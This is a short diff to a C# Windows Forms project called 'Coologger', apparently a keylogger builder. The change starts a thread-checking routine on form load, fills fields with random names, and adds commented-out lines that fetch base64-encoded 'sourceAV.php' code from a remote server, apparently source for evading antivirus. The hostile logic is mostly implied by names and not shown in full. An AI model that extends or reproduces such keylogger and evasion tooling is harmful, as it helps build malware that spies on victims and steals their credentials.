@@ -6,8 +6,10 @@ using System.IO;
 using System.Net;
 using System.Net.Mail;
 using System.Resources;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using Coologger.Check;
 using Microsoft.VisualBasic;
 
 namespace Coologger
@@ -55,12 +57,19 @@ namespace Coologger
 
         private void Form5Load(object sender, EventArgs e)
         {
+            Thread t = new Thread(ThreadChecker.CheckThreads);
+            t.Start();
+
             TextBox13.Text = Util.randomString(10);
             TextBox12.Text = Util.randomString(10);
             TextBox11.Text = Util.randomString(10);
             TextBox10.Text = Util.randomString(10);
             TextBox9.Text = Util.randomString(10);
             TextBox5.Text = Util.randomString(20);
+
+            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
+            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
+            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
         }
 
         private void FButton5Click(object sender, EventArgs e)
